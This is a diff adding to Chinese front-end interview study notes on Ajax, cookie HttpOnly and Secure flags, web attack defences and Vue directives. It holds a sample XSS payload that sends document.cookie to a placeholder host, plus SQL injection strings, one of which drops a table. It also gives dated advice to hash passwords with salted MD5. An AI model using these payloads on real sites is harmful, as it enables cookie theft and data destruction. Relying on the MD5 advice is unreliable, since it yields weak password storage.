@@ -113,6 +113,8 @@ axios  配置项  请求与相应
 
  •ajax是什么？作⽤？如何⼿动封装ajax请求？ 
 
+ •Ajax请求的步骤     https://blog.csdn.net/ANGWH/article/details/106751587
+
  •说说你对运⾏机制的理解？ EventLoop 
 
  •async await 是什么? 和Promise对⽐优缺点？    
@@ -174,9 +176,88 @@ axios  配置项  请求与相应
   •js事件循环机制(Event Loop)
 
  •改变this指向的三种方法     https://www.cnblogs.com/theblogs/p/9943179.html
+
+ •Cookie中的httponly的属性和作用     https://blog.csdn.net/qq_38553333/article/details/80055521
+        1.什么是HttpOnly?
+
+        如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。XSS全称Cross
+        SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入) 
+        恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。
+
+
+ •总结几种常见web攻击手段及其防御方式     https://www.cnblogs.com/-new/p/7135814.html
+
+     •XSS(跨站脚本攻击)        <script>window.open("www.xxx.com?param="+document.cookie) </script>
+
+     •CSRF（跨站请求伪造）          Referer设置true  利用token
+            告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理
+    
+
+     •SQL注入             select * from user where username = 'xxx' and password = ' ' or '1' = 1 '
+                    select * from user whwre username = 'xxx' and password =' ';drop table user;--'
+        1、在java中，我们可以使用预编译语句(PreparedStatement)，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。
+        2、很多orm框架已经可以对参数进行转义
+        3、做最坏的打算，即使被’拖库‘('脱裤，数据库泄露')。数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的（数据库存储用户名，盐（随机字符长），md5后的密文）方式。
+
+     •DDOS
+
+
+•Cookie中的httponly的属性和作用     https://blog.csdn.net/qq_38553333/article/details/80055521
+
+     response.setHeader( "Set-Cookie" , "cookiename=httponlyTest;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly");
+    例如：
+    //设置cookie
+
+    response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
+
+
+    //设置多个cookie
+
+    response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly");
+
+    response.addHeader("Set-Cookie", "timeout=30; Path=/test; HttpOnly");
+
+
+    //设置https的cookie
+
+    response.addHeader("Set-Cookie", "uid=112; Path=/; Secure; HttpOnly");
+
+     具体参数的含义在此不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取。
+
+     Cookie cookies[]=request.getCookies(); 
+
+
+ •什么是Referer？Referer的作用？空Referer是怎么回事？  https://www.sojson.com/blog/58.html
+
+ •Cookie的Secure属性和HttpOnly属性？      https://www.cnblogs.com/diligenceday/p/10885868.html
+
+    基于安全的考虑，需要给cookie加上Secure和HttpOnly属性，HttpOnly比较好理解，设置HttpOnly=true的cookie不能被js获取到，无法用document.cookie打出cookie的内容。
+
+    Secure属性是说如果一个cookie被设置了Secure=true，那么这个cookie只能用https协议发送给服务器，用http协议是不发送的。换句话说，cookie是在https的情况下创建的，而且他的Secure=true，那么之后你一直用https访问其他的页面
+    (比如登录之后点击其他子页面），cookie会被发送到服务器，你无需重新登录就可以跳转到其他页面。但是如果这是你把url改成http协议访问其他页面，你就需要重新登录了，因为这个cookie不能在http协议中发送。
+
+    例子是：
+
+    前提条件：https://localhost:9102应用对cookie设置了Secure=true
+
+    1. 访问 https://localhost:9102/manager
+
+    2. 输入用户名、密码，用IE或者Chrome的developer tool会看到response的header里，set-cookie的值里有Secure属性
+
+    3. 登录后，继续访问https://localhost:9102/manager#user，可以正常看到内容
+
+    4. 修改url，访问http://localhost:9100/manager#domain，会跳转到登录页面，因为cookie在http协议下不发送给服务器，服务器要求用户重新登录
  •
  •
  •
+ •
+ •
+
+
+ •解决跨域的5种方式
+     https://zhuanlan.zhihu.com/p/141977678?from_voters_page=true
+
+
  •
  •
  •
@@ -187,6 +268,19 @@ axios  配置项  请求与相应
     
 
  •JS isPrototypeOf()方法：检测一个对象是否存在于另一个对象的原型链中     http://c.biancheng.net/view/5801.html
+    constructor: ƒ Object()
+
+    hasOwnProperty: ƒ hasOwnProperty()
+
+    isPrototypeOf: ƒ isPrototypeOf()
+
+    propertyIsEnumerable: ƒ propertyIsEnumerable()
+
+    toLocaleString: ƒ toLocaleString()
+
+    toString: ƒ toString()
+    
+    valueOf: ƒ valueOf()
    
 
  •isPrototypeOf、instanceof、hasOwnProperty函数介绍      https://www.jianshu.com/p/44ba37660b4a
@@ -196,6 +290,21 @@ axios  配置项  请求与相应
 
 
  框架vue 
+ •v-if 和v-for一起使用？
+    当 v-if 与 v-for 一起使用时，v-for 具有比 v-if 更高的优先级，这意味着 v-if 将分别重复运行于每个 v-for 循环中
+    computed: {
+        activeItemList: function() {
+            return this.itemList.filter((item) => {
+                return item.isActive
+            })
+        }
+    }
+    <div v-for="item in activeItemList">{{item.value}}</div>
+
+    <template v-if="shouldShowItem">
+        <div v-for="item in itemList"></div>
+    </template>
+
 
  •v-if 、v-show的区别？使⽤场景？ 
 
